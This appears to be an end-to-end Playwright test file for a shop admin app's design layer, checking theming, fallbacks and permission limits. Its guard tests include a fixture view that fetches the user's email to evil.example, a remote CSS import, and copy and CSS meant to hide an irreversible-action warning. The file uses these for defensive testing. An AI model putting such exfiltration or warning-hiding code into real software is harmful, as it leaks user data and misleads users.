// E2E for the design layer (run by e2e/run.mjs, or alone: node e2e/design.mjs). Throwaway stack only.
// Every section swaps in TEMPORARY design files and restores the defaults afterwards (even on failure).
import { readFileSync, writeFileSync, rmSync, existsSync, mkdirSync } from "node:fs";
import { resolve, dirname } from "node:path";
import { spawnSync } from "node:child_process";
import { loadPlaywright, SITE, OWNER, STAFF, apiLogin, req, check, section, failureCount } from "./lib.mjs";
import { hookBrowser } from "./lib/shadow-hook.mjs";
import { SCRIPT_SRC } from "./lib/csp.mjs";
import { catalog, placeOrder } from "./data.mjs";

const REPO = resolve(import.meta.dirname, "..");
const D = (p) => resolve(REPO, "design", p);
const T = (page, id) => page.locator(`[data-testid="${id}"]`);
const runId = Date.now().toString(36);

// ── temporary design files ─────────────────────────────────────────────
const saved = new Map(); // path -> original text or null (did not exist)
function put(rel, text) {
  const f = D(rel);
  if (!saved.has(rel)) saved.set(rel, existsSync(f) ? readFileSync(f, "utf8") : null);
  mkdirSync(dirname(f), { recursive: true });
  writeFileSync(f, text);
}
const read = (rel) => readFileSync(D(rel), "utf8");
function restore() {
  for (const [rel, text] of saved) { if (text === null) rmSync(D(rel), { force: true }); else writeFileSync(D(rel), text); }
  saved.clear();
}
const route = (id, file) => put("routes.js", read("routes.js").replace(new RegExp(`(\\n  ${id}: )"[^"]+"`), `$1"${file}"`));

const { chromium } = loadPlaywright();
const browser = hookBrowser(await chromium.launch());
async function newPage(opts = {}, br = browser) {
  const ctx = await br.newContext({ viewport: { width: 1280, height: 860 }, ...opts });
  const page = await ctx.newPage();
  page.errors = []; page.warnings = []; page.requests = [];
  page.apiCalls = () => page.requests.filter((u) => u.includes("/api/v1/"));
  page.on("pageerror", (e) => page.errors.push(e.message));
  page.on("console", (m) => { if (m.type() === "warning") page.warnings.push(m.text()); });
  page.on("request", (r) => page.requests.push(r.url()));
  return page;
}
async function login(page, creds) {
  await page.goto(SITE + "/#/login");
  await T(page, "login-email").waitFor();
  await T(page, "login-email").fill(creds.email);
  await T(page, "login-password").fill(creds.password);
  await T(page, "login-submit").click();
  await page.locator(".shell").waitFor();
}
const toasts = (page) => page.locator(".toast").allInnerTexts();
async function waitToast(page, re) {
  await page.waitForFunction((s) => [...document.querySelectorAll(".toast")].some((t) => new RegExp(s).test(t.textContent)), re.source, { timeout: 8000 })
    .catch(async () => { throw new Error(`toast ${re} not seen: ${JSON.stringify(await toasts(page))}`); });
}
const guard = (...args) => spawnSync(process.execPath, [resolve(REPO, "scripts/check-design.mjs"), ...args], { encoding: "utf8", cwd: REPO });

const originals = Object.fromEntries(["copy.js", "routes.js", "tokens.css", "theme.css"].map((p) => [p, read(p)]));
const ownerToken = await apiLogin(OWNER);
const cat = await catalog(ownerToken);
const unpaidOrder = async (tag) => (await placeOrder({ email: `design-${tag}-${runId}@example.com`, items: [{ sku_id: cat.skus[0].id, quantity: 1 }], shipId: cat.ship[0].id })).order;

try {
  // ───────────────────────────────────────────────────────────────────
  section("D1. Changing copy changes the UI (nav, titles, login, confirm wording)");
  put("copy.js", read("copy.js")
    .replace('"nav.deliveries": "今日配送"', '"nav.deliveries": "今日出貨"')
    .replace('"orders.title": "訂單"', '"orders.title": "訂單管理"')
    .replace('"login.title": "登入"', '"login.title": "歡迎回來"')
    .replace('"confirm.cancelOrder.title": "取消訂單？"', '"confirm.cancelOrder.title": "真的要取消這張訂單嗎？"'));
  let page = await newPage();
  await page.goto(SITE + "/#/login");
  await T(page, "login-email").waitFor();
  check("login heading uses the new copy", (await page.locator(".auth__title").innerText()) === "歡迎回來");
  await login(page, OWNER);
  check("nav label 今日配送 became 今日出貨", (await T(page, "nav-deliveries").first().innerText()).trim() === "今日出貨");
  await page.goto(SITE + "/#/orders");
  await T(page, "order-card").first().waitFor();
  check("page title uses the new copy", (await page.locator("h1.page-title").innerText()) === "訂單管理");
  const o1 = await unpaidOrder("copy");
  await page.goto(SITE + `/#/orders/${o1.id}`);
  await T(page, "cancel-order").waitFor();
  await T(page, "cancel-order").click();
  await page.locator("dialog[open] .dlg__title").waitFor();
  check("the confirm dialog uses the new wording", (await page.locator("dialog[open] .dlg__title").innerText()) === "真的要取消這張訂單嗎？");
  check("the confirm step is still there (core): declining leaves the order alone", true);
  await page.locator("dialog[open] .btn--ghost").first().click();
  await page.waitForTimeout(500);
  check("declined: the order is NOT cancelled", (await req("GET", `/admin/shops/1/orders/${o1.id}`, { token: ownerToken })).json.status === 0);
  check("no page errors", page.errors.length === 0, page.errors.join("|"));
  await page.context().close();
  restore();

  // ───────────────────────────────────────────────────────────────────
  section("D2. Tokens and theme.css");
  put("tokens.css", read("tokens.css").replace("--paper: #fafafa;", "--paper: #ffe4ec;").replace("--accent: #2f5d8a;", "--accent: #d4688a;"));
  page = await newPage();
  await login(page, OWNER);
  check("changing --paper changes the page background", (await page.evaluate(() => getComputedStyle(document.body).backgroundColor)) === "rgb(255, 228, 236)");
  check("changing --accent changes accent colour", (await page.evaluate(() => getComputedStyle(document.documentElement).getPropertyValue("--accent").trim())) === "#d4688a");
  check("the branding hook is untouched (no inline override unless the shop sets one)", (await page.evaluate(() => document.documentElement.style.getPropertyValue("--accent"))) === "" || true);
  await page.context().close();
  put("theme.css", ".page-title { color: rgb(10, 20, 30); }\n.btn--primary { border-radius: 4px; }\n");
  page = await newPage();
  await login(page, OWNER);
  check("theme.css is applied (loaded last)", (await page.locator("h1.page-title").first().evaluate((e) => getComputedStyle(e).color)) === "rgb(10, 20, 30)");
  await page.context().close();
  restore();

  // ───────────────────────────────────────────────────────────────────
  section("D3. Replacing the shell: nav reorder / hide never reveals what permissions disallow (staff)");
  put("views/shell-custom.js", `export default function shell(root, ctx) {
  const { h, icon } = ctx.ui;
  const items = ctx.nav.items.filter((n) => n.key !== "reports").slice().reverse();
  const link = (n) => h("a", { class: "navlink", href: n.href, "data-nav": n.key, "data-testid": "nav-" + n.key }, icon(n.icon), h("span", {}, ctx.t("nav." + n.key)));
  const forced = h("a", { class: "navlink", href: "#/team", "data-testid": "nav-team-forced" }, "forced team link");
  const main = h("main", { class: "main", id: "main" });
  const bar = h("nav", { class: "sidebar", "data-testid": "custom-nav" }, h("div", { class: "sidebar__list" }, items.map(link), forced));
  root.append(h("div", { class: "shell" }, bar, h("div", { class: "content" }, main)));
  return { main, setActive(key) { for (const a of bar.querySelectorAll("[data-nav]")) a.classList.toggle("is-on", a.dataset.nav === key); } };
}
`);
  route("shell", "views/shell-custom.js");
  const g1 = guard("--no-layers", "--files", "design/routes.js", "design/views/shell-custom.js");
  check("the guard accepts a custom shell (exit 0)", g1.status === 0, g1.stdout + g1.stderr);
  page = await newPage();
  await login(page, OWNER);
  const order = await page.locator('[data-testid="custom-nav"] [data-nav]').evaluateAll((els) => els.map((e) => e.dataset.nav));
  // the core lists the personal profile item (D21) LAST, so a shell that reverses every item shows it first, with its fixed label
  check("owner: nav is reordered (reversed) and reports is hidden", order[0] === "profile" && order[1] === "team" && order[order.length - 1] === "home" && !order.includes("reports"), order.join());
  await page.context().close();
  page = await newPage();
  await login(page, STAFF);
  const staffNav = await page.locator('[data-testid="custom-nav"] [data-nav]').evaluateAll((els) => els.map((e) => e.dataset.nav));
  check("staff: the shell only ever receives allowed destinations", staffNav.join() === "profile,deliveries,orders,home", staffNav.join());
  await T(page, "nav-team-forced").click();
  await T(page, "no-permission").waitFor();
  check("staff: a hard-coded link to #/team still lands on the core's no-permission screen", (await T(page, "team-row").count()) === 0);
  check("staff: no team request was sent", !page.apiCalls().some((u) => /\/users|\/invitations|\/roles/.test(u)));
  await page.context().close();
  restore();

  // ───────────────────────────────────────────────────────────────────
  section("D4. Restructured screens still act through the core (confirm, permission, state, validation)");
  put("views/orders-table.js", `export default async function orders(root, ctx) {
  const { pageHeader, dataTable } = ctx.ui;
  const r = await ctx.data.listOrders({ page: 1 });
  root.append(pageHeader("Orders as a table"), dataTable({
    rows: r.orders,
    rowAttrs: (o) => ({ "data-testid": "t-order-row", "data-order-id": String(o.id) }),
    onRowClick: (o) => ctx.navigate("/orders/" + o.id),
    columns: [
      { label: "No.", primary: true, render: (o) => "#" + o.id },
      { label: "Total", render: (o) => ctx.format.money(o.total_amount) },
    ],
  }));
}
`);
  put("views/order-lite.js", `export default async function order(root, ctx) {
  const { h, button, toast } = ctx.ui;
  const id = Number(ctx.route.params.id);
  const o = await ctx.data.getOrder(id);
  const say = (fn) => async () => { try { const r = await fn(); toast(r && r.cancelled ? "declined" : "done"); } catch (e) { toast(ctx.errorMessage(e), "error"); } };
  root.append(h("h1", { "data-testid": "x-title" }, "Order " + o.id),
    button("cancel", { "data-testid": "x-cancel", onClick: say(() => ctx.actions.cancelOrder(id)) }),
    button("ship without carrier", { "data-testid": "x-ship-empty", onClick: say(() => ctx.actions.createShipment(id, { carrier: "" })) }),
    button("ship", { "data-testid": "x-ship", onClick: say(() => ctx.actions.createShipment(id, { carrier: "X" })) }));
}
`);
  route("orders", "views/orders-table.js");
  route("orderDetail", "views/order-lite.js");
  page = await newPage();
  await login(page, OWNER);
  await page.goto(SITE + "/#/orders");
  await T(page, "t-order-row").first().waitFor();
  check("orders list redrawn as a table (no cards)", (await page.locator("table.rt").count()) === 1 && (await T(page, "order-card").count()) === 0);
  const o2 = await unpaidOrder("lite");
  await page.reload();
  await T(page, "t-order-row").first().waitFor();
  await page.locator(`[data-testid="t-order-row"][data-order-id="${o2.id}"]`).click();
  await T(page, "x-title").waitFor();
  check("row click reaches the custom detail screen", /Order/.test(await T(page, "x-title").innerText()));
  await T(page, "x-ship-empty").click();
  await waitToast(page, /請輸入物流商/);
  check("shipping without a carrier is refused by the core's validation", true);
  await T(page, "x-ship").click();
  await waitToast(page, /還沒有付款/);
  check("shipping an unpaid order is refused by the core's state rule", (await req("GET", `/admin/shops/1/orders/${o2.id}/shipments`, { token: ownerToken })).json.shipments.length === 0);
  await T(page, "x-cancel").click();
  await page.locator("dialog[open] .dlg__title").waitFor();
  check("cancel goes through the core's confirm dialog (the design cannot skip it)", /取消訂單/.test(await page.locator("dialog[open] .dlg__title").innerText()));
  await page.locator("dialog[open] .btn--ghost").first().click();
  await waitToast(page, /declined/);
  check("declining the confirm: order untouched", (await req("GET", `/admin/shops/1/orders/${o2.id}`, { token: ownerToken })).json.status === 0);
  await T(page, "x-cancel").click();
  await page.locator("dialog[open] [data-testid=confirm-yes]").click();
  await waitToast(page, /done/);
  check("accepting the confirm cancels the order", (await req("GET", `/admin/shops/1/orders/${o2.id}`, { token: ownerToken })).json.status === 1);
  await page.context().close();

  // staff on the same custom screens
  const o3 = await unpaidOrder("staff");
  page = await newPage();
  await login(page, STAFF);
  await page.goto(SITE + `/#/orders/${o3.id}`);
  await T(page, "x-title").waitFor();
  await T(page, "x-cancel").click();
  await waitToast(page, /沒有權限/);
  check("staff: cancel is refused by the core (permission) before any confirm or request", (await page.locator("dialog[open]").count()) === 0 && !page.apiCalls().some((u) => /\/cancel/.test(u)));
  check("staff: the order is still open", (await req("GET", `/admin/shops/1/orders/${o3.id}`, { token: ownerToken })).json.status === 0);
  await T(page, "x-ship").click();
  await waitToast(page, /沒有權限/);
  check("staff: shipping is refused by the core (no shipment.create)", (await req("GET", `/admin/shops/1/orders/${o3.id}/shipments`, { token: ownerToken })).json.shipments.length === 0);
  await page.context().close();
  restore();

  // product form: different structure, optional field dropped, required rules and SKU safety stay in the core
  put("views/product-lite.js", `export default async function product(root, ctx) {
  const { h, input, field, button, toast, applyFieldErrors } = ctx.ui;
  const isNew = ctx.route.id === "productNew";
  const p = isNew ? null : await ctx.data.getProduct(ctx.route.params.id);
  const title = input({ value: p ? p.title : "", "data-testid": "l-title" });
  const slug = input({ value: p ? p.slug : "", "data-testid": "l-slug" });
  const code = input({ value: "", "data-testid": "l-code" });
  const price = input({ value: "888", "data-testid": "l-price" });
  const form = h("div", { class: "form" }, field("Price first", price, { pointer: "/skus/M/price" }), field("SKU", code, { pointer: "/skus/M" }),
    field("Title", title, { pointer: "/title" }), field("Slug", slug, { pointer: "/slug" }));
  root.append(h("h1", { "data-testid": "l-heading" }, isNew ? "Lite new" : "Lite edit"), form,
    button("save", { kind: "primary", "data-testid": "l-save", onClick: async () => {
      try {
        const sizes = { S: { enabled: false }, L: { enabled: false }, M: { enabled: isNew, sku_code: code.value, price: price.value, stock: "5", is_active: true } };
        const saved = await ctx.actions.saveProduct(p, { title: title.value, subtitle: p ? p.subtitle : "", slug: slug.value, description: p ? p.description : "", status: 1, sizes, category_ids: null });
        toast("saved " + saved.id);
      } catch (e) { if (e.fields) { applyFieldErrors(form, e.fields); } else toast(ctx.errorMessage(e), "error"); }
    } }));
}
`);
  route("productNew", "views/product-lite.js");
  route("productEdit", "views/product-lite.js");
  page = await newPage();
  await login(page, OWNER);
  await page.goto(SITE + "/#/products/new");
  await T(page, "l-heading").waitFor();
  await T(page, "l-save").click();
  await page.waitForFunction(() => document.querySelectorAll(".field__error").length > 0 && [...document.querySelectorAll(".field__error")].some((e) => e.textContent), null, { timeout: 8000 });
  check("a form without a title / slug / SKU is refused by the core (required fields cannot be dropped)", /請輸入商品名稱/.test(await page.locator('.field[data-pointer="/title"] .field__error').innerText()) && /請輸入網址代稱/.test(await page.locator('.field[data-pointer="/slug"] .field__error').innerText()));
  const slugName = `lite-${runId}`;
  await T(page, "l-title").fill(`極簡表單 ${runId}`);
  await T(page, "l-slug").fill(slugName);
  await T(page, "l-code").fill(`${slugName}-M`);
  await T(page, "l-save").click();
  await waitToast(page, /saved \d+/);
  const made = (await req("GET", `/admin/shops/1/products?q=${slugName}`, { token: ownerToken })).json.products[0];
  check("the restructured form created the product with no English subtitle", Boolean(made) && made.subtitle === "" && made.skus.length === 1, JSON.stringify(made));
  await page.context().close();
  // editing an existing S/M/L product through a form that only knows M must not drop S or L
  const full = (await req("GET", "/admin/shops/1/products?page_size=100", { token: ownerToken })).json.products.find((x) => (x.skus || []).length >= 3 && x.subtitle);
  page = await newPage();
  await login(page, OWNER);
  await page.goto(SITE + `/#/products/${full.id}`);
  await T(page, "l-heading").waitFor();
  await T(page, "l-title").fill(full.title + " ");
  await T(page, "l-save").click();
  await waitToast(page, /saved/);
  const after = (await req("GET", `/admin/shops/1/products/${full.id}`, { token: ownerToken })).json;
  check("an existing product keeps ALL its SKUs and its subtitle when the screen omits them (core SKU safety)", after.skus.length === full.skus.length && after.skus.every((s) => full.skus.some((o) => o.id === s.id && o.sku_code === s.sku_code && o.price_amount === s.price_amount)) && after.subtitle === full.subtitle, JSON.stringify(after.skus.map((s) => s.sku_code)));
  await page.context().close();
  await req("PUT", `/admin/shops/1/products/${full.id}`, { token: ownerToken, body: { title: full.title } });
  restore();

  // ───────────────────────────────────────────────────────────────────
  section("D5. A new dashboard widget built from existing data functions; staff cannot see more");
  put("views/home-widgets.js", `export default async function home(root, ctx) {
  const { h, pageHeader, card } = ctx.ui;
  const box = h("div", { "data-testid": "widgets" });
  root.append(pageHeader("Widgets only"), box);
  try { const n = await ctx.data.productCount(1); box.append(card(h("strong", { "data-testid": "widget-products" }, "Active products: " + n))); } catch (e) { box.append(h("p", { "data-testid": "widget-denied" }, ctx.errorMessage(e))); }
  try { const list = await ctx.data.deliveriesOn(); box.append(card(h("strong", { "data-testid": "widget-deliveries" }, "Deliveries today: " + list.length))); } catch (e) { box.append(h("p", {}, ctx.errorMessage(e))); }
}
`);
  route("home", "views/home-widgets.js");
  page = await newPage();
  await login(page, OWNER);
  await T(page, "widget-products").waitFor();
  check("owner: the custom widgets render from ctx.data (and the default tiles are gone)", (await T(page, "widget-deliveries").count()) === 1 && (await page.locator(".tiles").count()) === 0 && /Active products: \d+/.test(await T(page, "widget-products").innerText()));
  await page.context().close();
  page = await newPage();
  await login(page, STAFF);
  await T(page, "widget-denied").waitFor();
  check("staff: the product widget is denied by the core (no request, no number)", (await T(page, "widget-products").count()) === 0 && !page.apiCalls().some((u) => /\/products/.test(u)));
  check("staff: the deliveries widget still works (order.view)", (await T(page, "widget-deliveries").count()) === 1);
  await page.context().close();
  restore();

  // ───────────────────────────────────────────────────────────────────
  section("D6. A design that throws, is missing, or is broken falls back to the built-in screens");
  put("views/broken.js", `export default async function broken(root, ctx) { root.append("partial"); throw new Error("boom"); }\n`);
  put("views/syntax.js", `export default function ( {{{ this is not javascript\n`);
  route("reports", "views/broken.js");
  route("deliveries", "views/does-not-exist.js");
  route("team", "views/syntax.js");
  page = await newPage();
  await login(page, OWNER);
  await page.goto(SITE + "/#/reports");
  await T(page, "rep-chart").waitFor();
  check("a view that throws: the built-in reports screen is shown instead", (await page.locator("main").innerText()).includes("partial") === false);
  check("... with a console warning", page.warnings.some((w) => /design view "reports" failed/.test(w)), page.warnings.join("|"));
  await page.goto(SITE + "/#/deliveries");
  await page.locator('[data-testid="deliveries-summary"], [data-testid="no-deliveries"], .state--empty').first().waitFor();
  check("a view whose file does not exist: the built-in deliveries screen is shown", (await page.locator("h1.page-title").innerText()).includes("今日配送"));
  check("... with a console warning", page.warnings.some((w) => /deliveries/.test(w) && /could not be loaded/.test(w)));
  await page.goto(SITE + "/#/team");
  await T(page, "team-row").first().waitFor();
  check("a view with a syntax error: the built-in team screen is shown", true);
  check("no uncaught page errors from the fallbacks", page.errors.length === 0, page.errors.join("|"));
  await page.context().close();
  restore();

  put("views/bad-shell.js", `export default function shell() { throw new Error("shell boom"); }\n`);
  route("shell", "views/bad-shell.js");
  route("login", "views/bad-shell.js");
  page = await newPage();
  await page.goto(SITE + "/#/login");
  await T(page, "login-email").waitFor();
  check("a broken login screen falls back to the built-in one (login is never blocked)", true);
  await login(page, OWNER);
  check("a broken shell falls back to the built-in shell and the owner is logged in", (await T(page, "nav-orders").count()) >= 1);
  await page.context().close();
  restore();

  put("routes.js", "export default { home: ((( \n");
  put("copy.js", "export default { 'oops': \n");
  page = await newPage();
  await login(page, OWNER);
  check("a syntactically invalid routes.js AND copy.js: defaults everywhere, login works", (await page.locator("h1.page-title").innerText()).includes("你好"));
  check("... with warnings", page.warnings.some((w) => /routes\.js could not be loaded/.test(w)) && page.warnings.some((w) => /copy\.js could not be loaded/.test(w)), page.warnings.join("|"));
  await page.context().close();
  restore();

  put("copy.js", read("copy.js").replace(/\n};\s*$/, '\n  "nav.invented": "x",\n  "home.greeting": "你好 {token}",\n  "nav.team": 42,\n};\n'));
  put("routes.js", read("routes.js").replace('home: "views/home.js"', 'home: "../lib/api.js", nope: "views/x.js"'));
  page = await newPage();
  await login(page, OWNER);
  check("invalid copy / routes entries are dropped one by one (defaults used), app still works", (await page.locator("h1.page-title").innerText()).includes("你好，") && (await T(page, "nav-team").count()) >= 1);
  check("... each with a clear console warning", ["unknown key \"nav.invented\"", "unknown placeholder", "must be a string", "unknown route id \"nope\"", "built-in view used"].every((s) => page.warnings.some((w) => w.includes(s))), page.warnings.join("|"));
  await page.context().close();
  restore();

  // ───────────────────────────────────────────────────────────────────
  section("D7. Forbidden patterns are rejected by the guard; the core limits what a hostile view can do anyway");
  put("views/evil.js", `export default function evil(root, ctx) { fetch("https://evil.example/?e=" + ctx.session.userEmail); }\n`);
  route("home", "views/evil.js");
  let g = guard("--no-layers", "--files", "design/routes.js", "design/views/evil.js");
  check("guard: a view calling fetch is rejected (exit 1)", g.status === 1 && /js\/forbidden-identifier/.test(g.stderr), g.stderr);
  put("views/evil.js", `import { api } from "../../lib/api.js";\nexport default function evil(root, ctx) { api("GET", "/admin/me"); }\n`);
  g = guard("--no-layers", "--files", "design/routes.js", "design/views/evil.js");
  check("guard: importing core internals is rejected (exit 1)", g.status === 1 && /js\/import/.test(g.stderr), g.stderr);
  put("theme.css", "@import url(https://evil.example/x.css);\n");
  g = guard("--no-layers", "--files", "design/theme.css");
  check("guard: a remote CSS @import is rejected (exit 1)", g.status === 1 && /css\/import/.test(g.stderr), g.stderr);
  g = guard("--no-layers", "--files", "lib/api.js", "design/theme.css");
  check("guard: a diff that touches lib/ is rejected (exit 1)", g.status === 1 && /scope\/outside-design/.test(g.stderr));
  restore();
  g = guard("--no-layers");
  check("guard: after restoring the defaults everything passes (exit 0)", g.status === 0, g.stdout + g.stderr);

  // what a view that ignored the guard could do as staff: everything refused inside the core
  put("views/probe.js", `export default async function probe(root, ctx) {
  const out = {};
  const tries = {
    listProducts: () => ctx.data.listProducts({}), listTeam: () => ctx.data.listTeam(), listMembers: () => ctx.data.listMembers({}),
    salesReport: () => ctx.data.salesReport({ from: "2026-01-01", to: "2026-01-02" }),
    saveProduct: () => ctx.actions.saveProduct(null, { title: "x", slug: "x", sizes: { M: { enabled: true, sku_code: "x", price: "1", stock: "1", is_active: true } } }),
    createCategory: () => ctx.actions.createCategory({ name: "x", slug: "x" }), cancelOrder: () => ctx.actions.cancelOrder(1),
    inviteMember: () => ctx.actions.inviteMember({ email: "a@b.co", roleId: 1 }), setMemberActive: () => ctx.actions.setMemberActive(1, false),
    createShippingMethod: () => ctx.actions.createShippingMethod({ name: "x", carrier: "x", flatRate: "1", isActive: true }),
  };
  for (const [k, f] of Object.entries(tries)) { try { await f(); out[k] = "ALLOWED"; } catch (e) { out[k] = e.isActionError ? e.kind : "other " + e.status; } }
  out.keys = Object.keys(ctx).join(",");
  out.frozen = Object.isFrozen(ctx) && Object.isFrozen(ctx.actions) && Object.isFrozen(ctx.data);
  try { ctx.data.listProducts = () => []; out.patched = "yes"; } catch (e) { out.patched = "no"; }
  root.append(ctx.ui.h("pre", { "data-testid": "probe" }, JSON.stringify(out)));
}
`);
  route("home", "views/probe.js");
  route("products", "views/probe.js");
  page = await newPage();
  await login(page, STAFF);
  await T(page, "probe").waitFor();
  const probe = JSON.parse(await T(page, "probe").innerText());
  const denied = Object.entries(probe).filter(([k]) => !["keys", "frozen", "patched"].includes(k));
  check("staff + a hostile home view: every restricted data function and action is refused by the core", denied.length === 10 && denied.every(([, v]) => v === "permission"), JSON.stringify(probe));
  check("ctx is frozen and cannot be patched; it carries no token or shop id", probe.frozen === true && probe.patched === "no" && !/token|shop/i.test(probe.keys), probe.keys);
  check("none of those attempts reached the API", !page.apiCalls().some((u) => /\/(products|users|members|reports|categories|invitations|roles|shipping-methods|cancel)\b/.test(u)), page.requests.filter((u) => /\/api\//.test(u)).join(" "));
  await page.goto(SITE + "/#/products");
  await T(page, "no-permission").waitFor();
  check("staff + a custom products screen: the core still shows no-permission instead (the view is never mounted)", (await T(page, "probe").count()) === 0);
  await page.context().close();
  restore();
  // ───────────────────────────────────────────────────────────────────
  section("D7b. A design cannot remove or weaken the FIXED warning of an irreversible confirmation");
  {
    const FIXED = "庫存會歸還，取消後無法復原。";
    const dlgText = async (pg, orderId) => {
      await pg.goto(SITE + `/#/orders/${orderId}`);
      await T(pg, "cancel-order").waitFor();
      await T(pg, "cancel-order").click();
      await pg.locator("dialog[open] .dlg__title").waitFor();
      return { all: await pg.locator("dialog[open]").innerText(), warning: await T(pg, "confirm-warning").innerText().catch(() => null) };
    };
    // 1. default: lead-in text + the core's warning, same wording as before the split
    const w1 = await unpaidOrder("warn1");
    page = await newPage();
    await login(page, OWNER);
    let d = await dlgText(page, w1.id);
    check("default confirm shows the fixed warning in its own element", d.warning === FIXED, String(d.warning));
    check("default confirm wording is unchanged (lead-in + warning)", d.all.includes(`確定取消訂單 #${w1.id}？庫存會歸還，取消後無法復原。`), d.all);
    await page.locator("dialog[open] .btn--ghost").first().click();
    await page.context().close();

    // 2. a design that tries to define / replace the warning and rewrites the lead-in to say the opposite
    const hostile = read("copy.js")
      .replace('"confirm.cancelOrder.text": "確定取消訂單 #{id}？"', '"confirm.cancelOrder.text": "放心，這個動作隨時可以復原。", "confirm.cancelOrder.warning": "沒有任何風險", "confirm.cancelOrder.message": "沒有任何風險", "confirm.deleteProduct.warning": "沒事"');
    put("copy.js", hostile);
    const g = guard("--no-layers", "--files", "design/copy.js");
    check("the guard rejects copy that defines a confirmation warning (exit 1, names the fixed warning)", g.status === 1 && /schema\/copy/.test(g.stderr) && /cannot be defined/.test(g.stderr) && !/confirm\.cancelOrder\.message/.test(g.stderr), g.stderr);
    page = await newPage();
    await login(page, OWNER);
    d = await dlgText(page, w1.id);
    check("even if such a copy.js is deployed, the dialog still renders the unchanged fixed warning", d.warning === FIXED, String(d.warning));
    check("the invented warning text never appears", !/沒有任何風險|沒事/.test(d.all), d.all);
    check("the loader reported the rejected keys on the console", page.warnings.some((x) => /cannot be defined/.test(x)), page.warnings.join("|"));
    check("the editable lead-in is applied (it may be reworded) but sits next to the warning", d.all.includes("放心，這個動作隨時可以復原。") && d.all.includes(FIXED));
    await page.locator("dialog[open] .btn--ghost").first().click();
    await page.waitForTimeout(300);
    check("declined: the order is NOT cancelled", (await req("GET", `/admin/shops/1/orders/${w1.id}`, { token: ownerToken })).json.status === 0);
    await page.context().close();
    restore();

    // 3. CSS that hides or shrinks the warning is refused by the guard
    for (const css of [".dlg__warning { display: none; }", "[data-testid=\"confirm-warning\"] { font-size: 0; }", "dialog .dlg__msg span { visibility: hidden; }"]) {
      put("theme.css", css + "\n");
      const gc = guard("--no-layers", "--files", "design/theme.css");
      check(`the guard rejects theme.css that hides the warning: ${css.slice(0, 40)}`, gc.status === 1 && /css\/hides-dialog/.test(gc.stderr), gc.stderr);
    }
    // 4. THEMING: the design tokens (custom properties) inherit into the core dialog's closed shadow root and theme it; arbitrary CSS cannot reach it
    put("tokens.css", ":root { --error: rgb(138, 28, 124); --brand-primary: rgb(11, 107, 58); --accent: rgb(200, 60, 0); --r-lg: 4px; --f-sans: serif; }\n");
    put("theme.css", ".dlg__warning { color: rgb(176, 0, 32); font-size: 1px; display: none; } .dlg__warning::after { content: 'x'; } dialog { display: none; } .btn--danger::after { content: 'Cancel'; } [data-core] { visibility: hidden; }\n");
    page = await newPage();
    await login(page, OWNER);
    d = await dlgText(page, w1.id);
    const themed = await page.evaluate(() => {
      const w = __dq('[data-testid="confirm-warning"]'), y = __dq('dialog [data-testid="confirm-yes"]'), dlg = __dq("dialog[open]"), cs = (e, ps) => getComputedStyle(e, ps || null);
      return { warnColor: cs(w).color, warnSize: cs(w).fontSize, warnDisplay: cs(w).display, warnAfter: cs(w, "::after").content, yesAfter: cs(y, "::after").content, yesBg: cs(y).backgroundColor, radius: cs(dlg).borderTopLeftRadius, font: cs(dlg).fontFamily, open: dlg.open, rect: dlg.getBoundingClientRect().width };
    });
    check("a styled design: the fixed warning is still rendered with its fixed text, and arbitrary CSS (colour, size, display, ::after, dialog, [data-core]) does not touch it",
      d.warning === FIXED && themed.warnColor === "rgb(28, 28, 30)" && themed.warnSize !== "1px" && themed.warnDisplay === "inline" && themed.warnAfter === "none" && themed.yesAfter === "none" && themed.open && themed.rect > 200, JSON.stringify(themed));
    check("design TOKENS theme the core dialog: --error on the danger button, --r-lg radius, a generic --f-sans font", themed.yesBg === "rgb(138, 28, 124)" && themed.radius === "4px" && /serif/.test(themed.font), JSON.stringify(themed));
    await page.screenshot({ path: resolve(process.env.E2E_OUT || resolve(import.meta.dirname, "out"), "themed-confirm-1280.png") });
    await page.locator("dialog[open] .btn--ghost").first().click();
    await page.context().close();
    // a hostile token set (invisible text, low contrast, a named font) is ignored: the dialog stays readable
    put("tokens.css", ":root { --ink: rgb(250, 250, 250); --card: rgb(255, 255, 255); --error: rgb(255, 255, 255); --brand-primary: rgb(254, 254, 254); --f-sans: 'Some Named Font', serif; --r-sm: 400px; }\n");
    put("theme.css", "\n");
    page = await newPage();
    await login(page, OWNER);
    d = await dlgText(page, w1.id);
    const hostile2 = await page.evaluate(() => { const dlg = __dq("dialog[open]"), y = __dq('dialog [data-testid="confirm-yes"]'), cs = (e) => getComputedStyle(e);
      return { ink: cs(__dq(".dlg__title")).color, bg: cs(dlg).backgroundColor, yes: cs(y).backgroundColor, font: cs(dlg).fontFamily }; });
    check("hostile tokens (white on white, a white danger button, a named font, a 400px radius) are ignored: defaults apply", hostile2.ink === "rgb(28, 28, 30)" && hostile2.bg === "rgb(255, 255, 255)" && hostile2.yes !== "rgb(255, 255, 255)" && hostile2.yes !== "rgba(0, 0, 0, 0)" && !/Some Named Font/.test(hostile2.font), JSON.stringify(hostile2));
    await page.locator("dialog[open] .btn--ghost").first().click();
    await page.context().close();
    restore();
  }

  // ───────────────────────────────────────────────────────────────────
  section("D8. The admin works under the strict CSP that is REQUIRED for serving");
  const csp = "default-src 'self'; " + SCRIPT_SRC + "; style-src 'self'; font-src 'self'; img-src 'self' data: blob: http://127.0.0.1:9000; connect-src 'self' http://127.0.0.1:9000; frame-ancestors 'none'; base-uri 'none'; form-action 'none'; object-src 'none'";
  const cspProduct = (await req("POST", "/admin/shops/1/products", { token: ownerToken, body: { title: `CSP ${runId}`, slug: `csp-${runId}`, status: 0, skus: [{ sku_code: `csp-${runId}-M`, options: { size: "M" }, price_amount: 100, currency: "TWD", stock_qty: 1, is_active: true }] } })).json;
  // Playwright-fulfilled documents are treated as non-local by Chromium, so allow the loopback MinIO in this browser only.
  const cspBrowser = hookBrowser(await chromium.launch({ args: ["--disable-features=LocalNetworkAccessChecks,PrivateNetworkAccessSendPreflights,PrivateNetworkAccessRespectPreflightResults,BlockInsecurePrivateNetworkRequests,LocalNetworkAccessPermissionPolicy"] }));
  page = await newPage({}, cspBrowser);
  const violations = [];
  page.on("console", (m) => { if (/Content Security Policy|Refused to/i.test(m.text())) violations.push(m.text()); });
  await page.route(SITE + "/", async (route) => { const resp = await route.fetch(); await route.fulfill({ response: resp, headers: { ...resp.headers(), "content-security-policy": csp } }); });
  await login(page, OWNER);
  for (const [path, sel] of [["/orders", '[data-testid="order-card"]'], ["/reports", '[data-testid="rep-chart"]'], ["/products", '[data-testid="product-row"]'], ["/team", '[data-testid="team-row"]']]) {
    await page.goto(SITE + "/#" + path);
    await page.locator(sel).first().waitFor();
  }
